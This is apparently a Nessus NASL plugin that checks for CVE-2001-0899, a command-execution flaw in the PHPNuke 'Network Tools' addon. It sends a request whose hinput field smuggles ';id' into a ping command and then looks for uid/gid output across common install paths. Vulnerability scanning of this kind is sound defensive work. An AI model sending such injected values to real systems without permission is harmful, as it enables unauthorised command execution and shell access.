#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
# Ref: http://www.isecurelabs.com/article.php?sid=209
#

if(description)
{
 script_id(11106);
 script_version ("$Revision: 1.5 $");
 script_cve_id("CVE-2001-0899");
 name["english"] = "NetTools command execution";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host execute arbitrary
commands through the use of the PHPNuke addon called 'Network Tools'.

An attacker may use this flaw to gain a shell on this system.

Solution : Upgrade to NetTools 0.3 or newer
Risk factor : Serious";




 script_description(english:desc["english"]);
 
 summary["english"] = "Executed 'id' through index.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


function check(loc)
{
 req = http_get(item:string(loc, "modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid"),
 		port:port);	
 
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 
 if(("uid=" >< r) && ("gid=" >< r))
  {
 	security_hole(port);
	exit(0);
  }
  return(0);
}


port = get_kb_item("Services/www");
if(!port) port = 80;

if(!get_port_state(port))exit(0);



dir[0] = "/";
dir[1] = "/nuke/";
dir[2] = "/demo/";
dir[3] = "/phpnuke/html/";
dir[4] = "/php_nuke/html/";
dir[5] = "/php/";
dir[6] = "/phpnew/";
dir[7] = "/nuke50/";
dir[8] = "";

for(i = 0 ; dir[i] ; i = i + 1 )
{ 
 url = dir[i];
 check(loc:dir[i]);
}

foreach dir (cgi_dirs())
{
check(loc:string(dir, "/"));
}
